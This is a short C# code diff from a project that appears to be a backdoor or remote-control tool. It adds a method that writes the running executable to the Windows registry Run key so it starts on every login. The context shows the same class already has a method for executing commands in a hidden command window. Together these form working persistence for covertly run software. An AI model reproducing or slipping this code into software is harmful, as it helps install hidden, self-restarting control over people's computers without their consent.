@@ -11,6 +11,8 @@ namespace MigatteNoGokui
 {
     class So2
     {
+        //Obtener informacion del archivo compilado
+        private string[] infoExe = new string[2];
         /*Metodo para la ejecucion de comandos windows / Cmd oculto.*/
         public Boolean ejecutarComando(string comando)
         {
@@ -201,5 +203,16 @@ namespace MigatteNoGokui
             return 0;
 
         }
+        //Establecer autoinicio en los registros de windows
+        public void autoinicioEjecutable()
+        {
+            infoExe[0] = System.Reflection.Assembly.GetEntryAssembly().Location; // para obtener la direccion del archivo exe (pos si se mueve de lugar)
+            infoExe[1] = System.Reflection.Assembly.GetExecutingAssembly().GetName().Name; // para obtener el nombre del archivo ejecutable (por si se le cambia de nombre)
+            Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+            key.SetValue(infoExe[1], infoExe[0]);
+        }
+        
     }
+
+
 }
